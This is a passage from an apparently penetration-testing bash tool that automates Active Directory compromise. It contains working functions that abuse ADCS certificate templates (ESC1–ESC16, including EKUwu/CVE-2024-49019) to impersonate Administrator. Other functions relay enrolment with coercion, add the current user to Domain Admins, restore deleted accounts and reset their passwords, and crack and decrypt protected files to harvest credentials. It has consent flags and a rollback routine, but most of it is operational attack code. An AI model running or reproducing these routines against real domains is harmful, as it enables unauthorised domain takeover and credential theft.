        -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$out" | tee -a "$LOGFILE"
    local rid; rid=$(grep -oiP 'request ID is\s*\K[0-9]+' <<<"$out" | head -1)
    if [[ -z "$rid" ]]; then
        _adcs_pwn_pfx "$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)" "ESC7"; return $?
    fi
    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" </dev/null 2>&1 ) | tee -a "$LOGFILE"
    local r2; r2=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$r2" | tee -a "$LOGFILE"
    _adcs_pwn_pfx "$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$r2" | tail -1 | xargs -r basename)" "ESC7"
}
# ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
_adcs_esc13() {
    local ca="$1" tpl="$2"; _adcs_setauth
    abuse_confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" </dev/null 2>&1 ); echo "$out" | tee -a "$LOGFILE"
    local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
    _adcs_pwn_pfx "$pfx" "ESC13" 1   # self hash/TGT is fine — it now carries the linked group
}
# ESC8 / ESC11 — relay to web/RPC enrollment. Needs a listener + coercion to US;
# best-effort and time-boxed (truly interactive, may need your own setup).
_adcs_relay() {
    local esc="$1" lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    warn "  ${esc}: relay is interactive (listener + coercion). Attempting a time-boxed auto-relay…"
    have certipy || return 1
    local tgt="http://${DC_FQDN:-$DCT}/certsrv/certfnsh.asp"
    run "certipy relay -target $tgt -template DomainController  (60s) + coerce DC→$lhost"
    ( cd "$OUTDIR" && timeout -k 10 60 certipy relay -target "$tgt" -template DomainController 2>&1 | tee -a "$LOGFILE" ) &
    local rpid=$!
    sleep 3
    $NXC smb "$DCT" $(nxc_cred_args | tr '\n' ' ') -M coerce_plus -o LISTENER="$lhost" 2>&1 | tail -5 | tee -a "$LOGFILE"
    wait "$rpid" 2>/dev/null
    local pfx; pfx=$(ls -t "$OUTDIR"/*dc*.pfx "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
    [[ -n "$pfx" ]] && { _adcs_pwn_pfx "$pfx" "$esc" "$DC_HOST\$"; return $?; }
    warn "  ${esc}: no cert captured — run the relay+coercion manually with your listener"; return 1
}

# ESC15 (EKUwu, CVE-2024-49019) — NOT a per-template misconfig, so certipy
# -vulnerable usually doesn't flag it: ANY schema-version-1 template you can enrol
# (e.g. the stock WebServer) lets you inject a Client-Authentication application
# policy and authenticate as someone else. We therefore detect it ourselves —
# precisely, NOT blindly: only v1 templates THIS identity can enrol (its name, its
# groups, or Authenticated/Domain Users in the enrolment rights). Generic, no
# hard-coded template/box. Stops at the first Administrator.
# An ADCS template's enrol right can point at an UNRESOLVED SID (certipy: "Failed
# to lookup object with SID X") — frequently a DELETED account. If that SID is in
# the AD Recycle Bin, restore THAT exact tombstone (it keeps its SID → it regains
# the enrol right), reset it, and queue it; the engine then finishes ESC15 as it.
# Pure SID correlation (enrol SIDs ∩ deleted-object SIDs) — no hard-coded names.
_adcs_restore_enroller() {   # _adcs_restore_enroller <space-separated SIDs>
    [[ "$DO_ABUSE" != "1" ]] && return 1
    have bloodyAD || return 1
    [[ ${#DELETED_SID[@]} -eq 0 ]] && return 1
    local ba; mapfile -t ba < <(bloody_args)
    local sid rec dn sam act
    for sid in $1; do
        rec="${DELETED_SID[${sid,,}]:-}"; [[ -z "$rec" ]] && continue
        dn="${rec%%$'\t'*}"; sam="${rec#*$'\t'}"
        [[ -z "$dn" || -z "$sam" ]] && continue
        warn "ESC15 enroller is a DELETED account: ${C_BOLD}${sam}${C_RESET} (SID ${sid})"
        # If an ACTIVE object already holds this name, restoring the tombstone hits
        # an RDN conflict (the live object's CN is still '$sam'). We do NOT rename or
        # delete a live account to force it (that's destructive — it broke a working
        # pivot before, and renaming sAMAccountName doesn't even clear the RDN). On a
        # clean domain there's a single tombstone and this restores straight away;
        # on a polluted Recycle Bin we surface the exact manual step instead.
        act=$(bloodyAD "${ba[@]}" get object "$sam" --attr objectSid 2>/dev/null | grep -oiP 'objectSid:\s*\K\S+' | head -1)
        if [[ -n "$act" ]]; then
            warn "  an active '${sam}' (${act}) already holds the name → not touching it. To finish manually:"
            detail "      # remove the active ${sam}, then restore the SID-matching tombstone and reset it:"
            detail "      bloodyAD ${ba[*]} set restore '$dn'"
            detail "      bloodyAD ${ba[*]} set password '$sam' '$PIVOT_PW'   # then re-run ESC15 as $sam"
            continue
        fi
        abuse_confirm "  Restore deleted enroller '${sam}' (SID ${sid}) from the Recycle Bin?" || continue
        local rout; rout=$(bloodyAD "${ba[@]}" set restore "$dn" 2>&1); echo "$rout" | tee -a "$LOGFILE"
        if grep -qiE 'restored|success' <<<"$rout"; then
            rb_record "Restored ADCS enroller $sam ($sid)" "echo 'Manual: re-delete $sam if the client needs it'"
            bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 >/dev/null
            bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'
            loot "★ Restored+reset enroller '${sam}' → pivoting to finish ESC15 as it"
            note_cred_source "$sam" "Recycle Bin restore of ADCS enroller (SID-matched)"
            unset "SEEN_CREDS[$(cred_key "$sam" "$PIVOT_PW" "")]"; unset "OWNED_GROUPS[${sam,,}]"
            queue_cred "$sam" "$PIVOT_PW" "" "Recycle Bin restore (ADCS enroller)"
            return 0
        fi
        warn "  could not restore '${sam}' (see log for the bloodyAD error)"
    done
    return 1
}

# Pick an enabled template to use as the ESC15 scenario-B ON-BEHALF-OF target:
# it must build its subject FROM AD (Enrollee Supplies Subject = False) and carry
# the Client Authentication EKU, so the admin cert we mint through it is genuinely
# PKINIT-capable. Prefer the stock 'User' template; else any client-auth one.
_adcs_clientauth_tpl() {                 # _adcs_clientauth_tpl <find-output>
    awk 'BEGIN{IGNORECASE=1}
        /Template Name/{ if(name!="" && ca && !ess) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); ca=0; ess=0 }
        /Client Authentication.*:[[:space:]]*True/{ ca=1 }
        /Enrollee Supplies Subject.*:[[:space:]]*True/{ ess=1 }
        END{ if(name!="" && ca && !ess) print name }' <<<"$1" | sed 's/[[:space:]]*$//' | sort -u
}

# EKUwu has NO single "request as admin" call: the v1 cert inherits the template's
# EKU (Server Authentication), so PKINIT rejects it ("certificate is not valid for
# client authentication") — that's the error you hit. Editing the template (ESC4)
# is NOT the fix here (the enrollee almost never has WriteProperty on it; only DA/EA
# do). EKUwu needs no template change at all. Two real abuses, tried in order:
#   B) Enrollment Agent — inject the 'Certificate Request Agent' application policy
#      into the v1 cert, then use it to enrol On-Behalf-Of Administrator against a
#      normal client-auth (User) template → that admin cert IS PKINIT-capable → NT hash.
#   A) Schannel — inject 'Client Authentication' application policy + -upn/-sid admin;
#      PKINIT still can't use a Server-Auth EKU, but an LDAPS Schannel bind CAN, so we
#      bind as Administrator and add the current principal to Domain Admins, then re-queue.
_adcs_esc15_exploit() {                  # _adcs_esc15_exploit <ca> <v1tpl> <obo_clientauth_tpl>
    local ca="$1" tpl="$2" obo="$3"
    _adcs_setauth
    [[ -z "$_ADCS_SID" ]] && _ADCS_SID="$(_adcs_admin_sid)"
    # NO interactive re-prompt: --abuse (DO_ABUSE=1) is already the consent gate and
    # is enforced by BOTH callers (blind path + flagged path). The old `confirm` here
    # double-gated ONLY this path and silently stalled automated/non-tty runs (the
    # [y/N] got EOF → skip → "detected but did nothing"). ESC15/EKUwu is a clean,
    # reliable Administrator impersonation, so under --abuse we just run it — exactly
    # like every other flagged ESC in _abuse_adcs.
    info "  ESC15/EKUwu: abusing v1 template '$tpl' to impersonate Administrator…"

    # ---- Scenario B: enrollment agent → on-behalf-of (yields a PKINIT cert + hash)
    if [[ -n "$obo" ]]; then
        info "  ESC15-B: minting a Certificate-Request-Agent cert from '$tpl'…"
        run "certipy req … -template $tpl -application-policies 'Certificate Request Agent'"
        local oa; oa=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
            certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
            -application-policies 'Certificate Request Agent' \
            -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$oa" | tee -a "$LOGFILE"
        local agent; agent=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$oa" | tail -1 | xargs -r basename)
        if [[ -n "$agent" && -f "$OUTDIR/$agent" ]]; then
            info "  ESC15-B: enrolling On-Behalf-Of Administrator via '$obo'…"
            run "certipy req … -template $obo -pfx $agent -on-behalf-of '${DOMAIN%%.*}\\administrator'"
            local ob; ob=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
                certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$obo" -pfx "$agent" \
                -on-behalf-of "${DOMAIN%%.*}\\administrator" \
                -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$ob" | tee -a "$LOGFILE"
            local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$ob" | tail -1 | xargs -r basename)
            _adcs_pwn_pfx "$pfx" "ESC15(EKUwu/agent)" && return 0
        else
            warn "  ESC15-B: no enrollment-agent cert issued (template may forbid the agent app-policy)"
        fi
    fi

    # ---- Scenario A: Schannel LDAP (cert keeps Server-Auth EKU → no PKINIT) ---------
    info "  ESC15-A: requesting a Client-Authentication cert as Administrator (Schannel path)…"
    local sidargs=(); [[ -n "$_ADCS_SID" ]] && sidargs=(-sid "$_ADCS_SID")
    run "certipy req … -template $tpl -upn administrator@$DOMAIN -application-policies 'Client Authentication'"
    local ra; ra=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" \
        certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
        -upn "administrator@${DOMAIN}" "${sidargs[@]}" -application-policies 'Client Authentication' \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$ra" | tee -a "$LOGFILE"
    local apfx; apfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$ra" | tail -1 | xargs -r basename)
    [[ -z "$apfx" || ! -f "$OUTDIR/$apfx" ]] && { warn "  ESC15-A: no certificate issued from '$tpl'"; return 1; }
    # PKINIT can't use a Server-Auth EKU cert → bind over Schannel as Administrator
    # and add the CURRENT principal to Domain Admins (driven non-interactively on
    # the ldap-shell's stdin), then re-queue it so the engine DCSyncs as DA.
    local grp="Domain Admins"
    info "  ESC15-A: PKINIT can't use a Server-Auth EKU → Schannel LDAP as Administrator (add $USER → '$grp')…"
    run "certipy auth -pfx $apfx -dc-ip $DC_IP -ldap-shell  « add_user_to_group $USER '$grp'"
    local lout; lout=$( cd "$OUTDIR" && printf 'add_user_to_group %s "%s"\nexit\n' "$USER" "$grp" | \
        "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$apfx" -dc-ip "$DC_IP" -ldap-shell 2>&1 ); echo "$lout" | tee -a "$LOGFILE"
    # the ldap-shell prints 'result: OK' (or 'Successfully ...') only on a real add;
    # the 'Adding user: …' banner prints even on failure — don't match on it.
    if grep -qiE 'result:[[:space:]]*(ok|0)\b|successfully (added|modified)|succeeded' <<<"$lout"; then
        rb_record "ESC15-A: added $USER to '$grp' via Schannel LDAP" \
                  "echo 'Manual: remove $USER from $grp (bloodyAD remove groupMember \"$grp\" $USER)'"
        loot "★★★ ESC15 (EKUwu/Schannel) → ${C_BOLD}${USER}${C_RESET} added to '${grp}' — re-queueing for DCSync"
        note_cred_source "$USER" "ADCS ESC15 (EKUwu Schannel → Domain Admins)"
        OWNED_GROUPS[${USER,,}]="Domain Admins"
        unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "$HASH")]"
        queue_cred "$USER" "$PASS" "$HASH" "ESC15 (EKUwu Schannel → Domain Admins)"
        return 0
    fi
    warn "  ESC15: Schannel LDAP didn't confirm the group change — finish manually: certipy auth -pfx $apfx -dc-ip $DC_IP -ldap-shell"
    return 1
}

_adcs_esc15_blind() {
    local ca="$1"; have certipy || return 1
    _adcs_setauth
    _ADCS_SID="$(_adcs_admin_sid)"   # cert must carry Administrator's SID (strong mapping)
    subsection "ESC15/EKUwu check — schema-v1 'Enrollee-Supplies-Subject' templates"
    local full; full=$( "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${_ADCS_AUTH[@]}" \
        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" -stdout -enabled </dev/null 2>&1 )
    # ESC15 needs a SCHEMA-VERSION-1 template that lets the ENROLLEE SUPPLY THE
    # SUBJECT. v1 + ESS = WebServer/SubCA-class. Parsed dynamically — no hard-coded
    # names. We don't pre-filter by enrolment rights (they can hide behind unresolved
    # SIDs); the certipy req itself is the real enrolment test (DENIED vs issued).
    local tpls; tpls=$(awk 'BEGIN{IGNORECASE=1}
        /Template Name/{ if(name!="" && v1 && ess) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); v1=0; ess=0 }
        /Schema Version.*:[[:space:]]*1[[:space:]]*$/{ v1=1 }
        /Enrollee Supplies Subject.*:[[:space:]]*True/{ ess=1 }
        /EnrolleeSuppliesSubject/{ ess=1 }
        END{ if(name!="" && v1 && ess) print name }' <<<"$full" | sed 's/[[:space:]]*$//' | sort -u)
    [[ -z "$tpls" ]] && { info "  no v1 Enrollee-Supplies-Subject template → ESC15 not applicable here"; return 1; }
    # The on-behalf-of target for scenario B (prefer the stock 'User' template).
    local catpls; catpls=$(_adcs_clientauth_tpl "$full")
    local obo; obo=$(grep -ixF 'User' <<<"$catpls" | head -1)
    [[ -z "$obo" ]] && obo=$(head -1 <<<"$catpls")
    [[ -z "$obo" ]] && obo="User"   # stock client-auth template — almost always present
    local t n=0
    while IFS= read -r t; do
        [[ -z "$t" ]] && continue
        (( n++ >= 5 )) && break
        loot "ESC15 candidate: v1+ESS template '${t}' (EKUwu / CVE-2024-49019)"
        _adcs_esc15_exploit "$ca" "$t" "$obo" && return 0
    done <<<"$tpls"
    # All v1+ESS templates were denied — the real enroller may be a DELETED account
    # whose SID is in the enrol ACE (certipy couldn't resolve it). Cross-reference
    # the SIDs in the template enum with the AD Recycle Bin and restore the match.
    # NB: restoring the enroller is a PIVOT (it queues a new identity to run ESC15
    # AS), NOT an escalation to Administrator — so we must NOT return success here,
    # or the caller sets ADCS_PWNED=1 and the restored identity's own ADCS phase is
    # skipped (it can enrol → it's the one that actually completes EKUwu).
    _adcs_restore_enroller "$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$full" | sort -u)"
    return 1
}

_abuse_adcs() {
    local cout="$1"
    have certipy || return 1
    local ca; ca=$(grep -ioP 'CA Name\s*:\s*\K\S+' <<<"$cout" | head -1)
    # Only the ESC(s) certipy actually flagged on THIS CA — we don't sweep 1..16,
    # we exploit exactly what's present (one, or several), and stop the moment one
    # lands Administrator.
    local found; found=$(grep -oiE 'ESC[0-9]+' <<<"$cout" | tr 'a-z' 'A-Z' | sort -u -V)
    [[ -z "$found" ]] && return 1
    loot "ADCS vulnerabilities identified: $(echo "$found" | paste -sd' ' -)"
    [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to auto-exploit the flagged ESC(s) and pivot to Administrator)"; return 1; }
    [[ -z "$ca" ]] && { warn "Could not parse CA name — exploit ADCS manually (see certipy_find.txt)"; return 1; }

    # When SEVERAL are present, try them in a RELIABILITY/SAFETY order, not numeric:
    # clean direct-impersonation first; template/CA-modifying and relay (need a
    # listener / leave artifacts) last. Stop at the first that yields Administrator.
    local esc tpl escs="" e
    for e in ESC1 ESC2 ESC6 ESC9 ESC10 ESC16 ESC15 ESC3 ESC13 ESC4 ESC7 ESC8 ESC11 ESC5 ESC14; do
        grep -qiw "$e" <<<"$found" && escs+="$e "
    done
    for e in $found; do grep -qiw "$e" <<<"$escs" || escs+="$e "; done   # any new/unknown ESCs last
    _ADCS_SID="$(_adcs_admin_sid)"      # for strong-mapping (-sid); empty is fine
    for esc in $escs; do                # flagged ones only, in priority order
        tpl=$(_adcs_template_for "$cout" "$esc"); [[ -z "$tpl" ]] && tpl="User"
        case "$esc" in
            ESC1|ESC2|ESC6)  _adcs_req_admin "$ca" "$tpl" "$esc" 1 && return 0 ;;   # SAN impersonation (+SID)
            ESC9|ESC10|ESC16) _adcs_req_admin "$ca" "$tpl" "$esc" 0 && return 0 ;;  # missing SID extension → UPN map
            ESC15) local _obo; _obo=$(_adcs_clientauth_tpl "$cout" | grep -ixF 'User' | head -1)
                   [[ -z "$_obo" ]] && _obo=$(_adcs_clientauth_tpl "$cout" | head -1)
                   [[ -z "$_obo" ]] && _obo="User"
                   _adcs_esc15_exploit "$ca" "$tpl" "$_obo" && return 0 ;;
            ESC3)  _adcs_esc3  "$ca" "$tpl" && return 0 ;;
            ESC4)  _adcs_esc4  "$ca" "$tpl" && return 0 ;;
            ESC7)  _adcs_esc7  "$ca"        && return 0 ;;
            ESC13) _adcs_esc13 "$ca" "$tpl" && return 0 ;;
            ESC8|ESC11) _adcs_relay "$esc"  && return 0 ;;
            ESC5)  warn "  ESC5 (vulnerable PKI object ACL) → review the writable PKI object in certipy_find.txt (e.g. take over the CA host / NTAuthCertificates)" ;;
            ESC14) warn "  ESC14 (weak explicit mapping) → write altSecurityIdentities on a privileged target to your cert (needs that write right)" ;;
            *) warn "  $esc detected — see certipy_find.txt" ;;
        esac
    done
    warn "ADCS auto-exploit didn't reach Administrator — review certipy_find.txt"
    return 1
}

# ===========================================================================
#  DELETED & DISABLED ACCOUNTS  —  detect, and (with --abuse) restore/enable
#  Chain: restore a deleted user → re-enable it → a leaked password now works.
# ===========================================================================
phase_recycle_disabled() {
    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
    have bloodyAD || return
    section "ACCOUNT LIFECYCLE · DISABLED · DELETED · PASSWORD-RESET"
    local ba; mapfile -t ba < <(bloody_args)
    local changed=0

    subsection "Disabled accounts (re-enable + a known password = access)"
    local dis
    dis=$(bloodyAD "${ba[@]}" get search \
            --filter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
    if [[ -n "$dis" ]]; then
        echo "$dis" | while read -r u; do echo -e "      ${C_YELLOW}· $u (disabled)${C_RESET}"; done
        echo "$dis" >"$OUTDIR/disabled_accounts.txt"
        if [[ "$DO_ABUSE" == "1" ]]; then
            echo "$dis" | while read -r u; do
                abuse_confirm "  Re-enable disabled account '$u'?" || continue
                if bloodyAD "${ba[@]}" remove uac "$u" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|removed|modif'; then
                    loot "★ Re-enabled '$u' → added to spray pool"
                    rb_record "Re-enabled account $u" "bloodyAD ${ba[*]} add uac '$u' -f ACCOUNTDISABLE"
                    echo "$u" >>"$OUTDIR/users_all.txt"; changed=1
                fi
            done
        else
            info "  (report-only; --abuse to re-enable and spray them)"
        fi
    else
        info "No disabled user accounts found"
    fi

    subsection "Accounts that must change password at next logon (pwdLastSet=0)"
    # An admin set a temporary password and the user never logged in. If we hold
    # ForceChangePassword over them (see ACL phase) or know that temp password,
    # it's an easy takeover. Surface them as priority targets.
    local mustchg
    mustchg=$(bloodyAD "${ba[@]}" get search \
            --filter '(&(objectCategory=person)(objectClass=user)(pwdLastSet=0)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
    if [[ -n "$mustchg" ]]; then
        echo "$mustchg" | while read -r u; do echo -e "      ${C_MAGENTA}· $u (password reset pending — temp password set)${C_RESET}"; done
        echo "$mustchg" >"$OUTDIR/must_change_password.txt"
        loot "Accounts pending password change — prime targets for ForceChangePassword / temp-password reuse"
    else
        info "No accounts pending a password change"
    fi

    subsection "Deleted objects (AD Recycle Bin)"
    local del
    # Tombstoned/deleted/recycled objects need BOTH show-recycled (…2064) and
    # show-deactivated-link (…2065) controls together — passing only one returns
    # nothing even when you hold restore rights (this is general, not lab-specific).
    del=$(bloodyAD "${ba[@]}" get search --filter '(isDeleted=TRUE)' \
            --attr sAMAccountName,distinguishedName,lastKnownParent,objectSid \
            -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 2>&1)
    if echo "$del" | grep -qiE 'noSuchObject|denied|ERROR|Traceback'; then
        info "Deleted objects not accessible with this identity (need rights / Recycle Bin)"
    elif echo "$del" | grep -qi 'distinguishedName'; then
        # Index every tombstone by its objectSid (a deleted object KEEPS its SID).
        # Lets ESC15 (and others) map an unresolved ACE SID → "restore THIS account".
        while IFS=$'\t' read -r _sid _dn _sam; do
            [[ -n "$_sid" && -n "$_dn" ]] && DELETED_SID["${_sid,,}"]="${_dn}"$'\t'"${_sam}"
        done < <(echo "$del" | awk '
            /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
            /^sAMAccountName:/{sam=$0; sub(/^sAMAccountName:[ ]*/,"",sam)}
            /^objectSid:/{sid=$0; sub(/^objectSid:[ ]*/,"",sid)}
            /^[[:space:]]*$/{ if(dn ~ /DEL:/ && sid ~ /^S-1-5-21-/) print sid"\t"dn"\t"sam; dn="";sam="";sid="" }
            END{ if(dn ~ /DEL:/ && sid ~ /^S-1-5-21-/) print sid"\t"dn"\t"sam }')
        echo "$del" | grep -oiP 'distinguishedName:\s*\K.*DEL:[^,]+.*' | while read -r dn; do
            echo -e "      ${C_MAGENTA}· $dn${C_RESET}"; done
        echo "$del" >"$OUTDIR/deleted_objects.txt"
        loot "Deleted objects present — restorable if you hold the rights"
        if [[ "$DO_ABUSE" == "1" ]]; then
            # Pair each tombstoned object's DN with its sAMAccountName (restore by
            # DN, but enable + spray by the *account name*, not the CN).
            while IFS=$'\t' read -r dn sam; do
                [[ -z "$dn" ]] && continue
                local name="${sam:-$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')}"
                abuse_confirm "  Restore deleted account '$name'?" || continue
                if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
                    loot "★ Restored '$name' — re-enabling & taking it over"
                    rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
                    bloodyAD "${ba[@]}" remove uac "$sam" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null
                    [[ -n "$sam" ]] && { echo "$sam" >>"$OUTDIR/users_all.txt"; changed=1; }
                    # We usually hold rights over the restored object (e.g. GenericAll
                    # on its parent OU) → reset its password and pivot to it directly,
                    # instead of hoping a leaked password still works. This is the
                    # the classic OU-GenericAll → restore-deleted-user → reset chain.
                    if [[ -n "$sam" ]] && bloodyAD "${ba[@]}" set password "$sam" "$PIVOT_PW" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|changed'; then
                        loot "★ Reset restored account '${sam}' → pivoting as it"
                        note_cred_source "$sam" "AD Recycle Bin restore + password reset"
                        rb_record "Reset password of restored $sam (ORIGINAL UNKNOWN)" "echo 'Manual: coordinate password restore for $sam'"
                        queue_cred "$sam" "$PIVOT_PW" "" "AD Recycle Bin restore + reset"
                    fi
                fi
            done < <(echo "$del" | awk '
                # When several tombstones share a sAMAccountName (a box reset / re-create
                # leaves stale duplicates), restore ONLY the highest-RID one — that is the
                # current account the live ACLs (e.g. an ADCS template enrol) reference;
                # the lower-RID ones are dead duplicates from older builds.
                function rid(s,  n,a){ n=split(s,a,"-"); return a[n]+0 }
                function flush(){ if(dn ~ /DEL:/ && sam!=""){ r=rid(sid);
                    if(!(sam in brid) || r>brid[sam]){ brid[sam]=r; bdn[sam]=dn } } }
                /^distinguishedName:/{dn=$0; sub(/^distinguishedName:[ ]*/,"",dn)}
                /^sAMAccountName:/{sam=$0; sub(/^sAMAccountName:[ ]*/,"",sam)}
                /^objectSid:/{sid=$0; sub(/^objectSid:[ ]*/,"",sid)}
                /^[[:space:]]*$/{ flush(); dn="";sam="";sid="" }
                END{ flush(); for(k in bdn) print bdn[k]"\t"k }')
        else
            info "  (report-only; --abuse to restore them)"
        fi
    else
        info "No deleted objects found"
    fi
    [[ "$changed" == "1" ]] && sort -u -o "$OUTDIR/users_all.txt" "$OUTDIR/users_all.txt"
}

# ===========================================================================
#  CLEANUP  —  revert every change this tool made (responsible teardown)
# ===========================================================================
run_cleanup() {
    section "CLEANUP · REVERTING TOOL-MADE CHANGES"
    if [[ ! -s "$ROLLBACK_FILE" ]]; then
        ok "No tracked changes to revert — nothing to clean up"
        return
    fi
    warn "The following changes were made and will be reverted:"
    grep '^### ' "$ROLLBACK_FILE" | sed 's/^### /      - /'
    confirm "Proceed with rollback?" || { info "Cleanup aborted by operator"; return; }
    # Execute every non-comment line as an undo command
    grep -v '^### ' "$ROLLBACK_FILE" | while IFS= read -r cmd; do
        [[ -z "$cmd" ]] && continue
        run "$cmd"; eval "$cmd" 2>&1 | tee -a "$LOGFILE"
    done
    ok "Rollback complete. Reminder: this tool never touched event logs — confirm log integrity with the client."
}

# ===========================================================================
#  SHARE LOOTING  —  spider readable shares, pull & process interesting files
# ===========================================================================
# Extract a crackable hash from a password-protected file and crack it.
crack_file() {
    local f="$1" base ext tool
    base="$(basename "$f")"; ext="${base##*.}"; ext="${ext,,}"
    # Already cracked/attempted this doc in a previous pivot pass → don't redo it
    # (the recovered password is already in FOUND_SECRETS). Saves re-running john.
    [[ -n "${CRACKED_DOCS[$base]:-}" ]] && return
    case "$ext" in
        xls|xlsx|xlsm|doc|docx|ppt|pptx) tool=office2john ;;
        pdf)  tool=pdf2john ;;
        zip)  tool=zip2john ;;
        rar)  tool=rar2john ;;
        7z)   tool=7z2john ;;
        kdbx) tool=keepass2john ;;
        *) case "$base" in id_rsa|*.ppk|*.pem|*.key) tool=ssh2john ;; *) return ;; esac ;;
    esac
    have "$tool" || { warn "$tool not installed — cannot process $base"; return; }
    local hashf="$OUTDIR/filehash_${base}.txt"
    "$tool" "$f" 2>/dev/null >"$hashf"
    [[ ! -s "$hashf" ]] && { rm -f "$hashf"; return; }
    CRACKED_DOCS["$base"]=1     # mark attempted now → future passes skip it
    loot "Crackable hash extracted from ${C_BOLD}${base}${C_RESET} → cracking with john…"
    run "john --wordlist=$WORDLIST $hashf"
    john --wordlist="$WORDLIST" "$hashf" >/dev/null 2>&1
    local show pw
    show=$(john --show "$hashf" 2>/dev/null | grep -vE 'password hash|^$' | head -1)
    pw=$(echo "$show" | cut -d: -f2)
    if [[ -n "$pw" ]]; then
        loot "★ File password cracked → ${base} : ${C_GREEN}${C_BOLD}${pw}${C_RESET}"
        echo "${base}:${pw}" >>"$OUTDIR/cracked_files.txt"
        add_secret "$pw" "doc password: $base"
        decrypt_and_read "$f" "$pw" "$ext"
    else
        info "Could not crack ${base} with this wordlist"
    fi
}

# Decrypt an office/zip file with the cracked password and harvest its contents
decrypt_and_read() {
    local f="$1" pw="$2" ext="$3" base; base="$(basename "$f")"
    local dec="$OUTDIR/decrypted_${base}"
    case "$ext" in
        xls|xlsx|xlsm|doc|docx|ppt|pptx)
            if have msoffcrypto-tool; then
                msoffcrypto-tool "$f" "$dec" -p "$pw" 2>/dev/null \
                    && ok "Decrypted → decrypted_${base}" || { warn "msoffcrypto-tool could not decrypt"; return; }
            else
                warn "msoffcrypto-tool not installed → cannot auto-decrypt (install: pipx install msoffcrypto-tool)"; return
            fi ;;
        zip) mkdir -p "${dec}.d"; unzip -P "$pw" -o "$f" -d "${dec}.d" >/dev/null 2>&1 && dec="${dec}.d" ;;
        *) return ;;
    esac
    subsection "Reading decrypted contents of ${base} for credentials"
    # Extract ONLY human-readable cell/paragraph text (not the file's XML internals)
    local txt=""
    case "$ext" in
        xlsx|xlsm) txt=$(unzip -p "$dec" 'xl/sharedStrings.xml' 2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        docx)      txt=$(unzip -p "$dec" 'word/document.xml'     2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
        pptx)      txt=$(unzip -p "$dec" 'ppt/slides/slide*.xml' 2>/dev/null | sed -E 's/<[^>]*>/\n/g') ;;
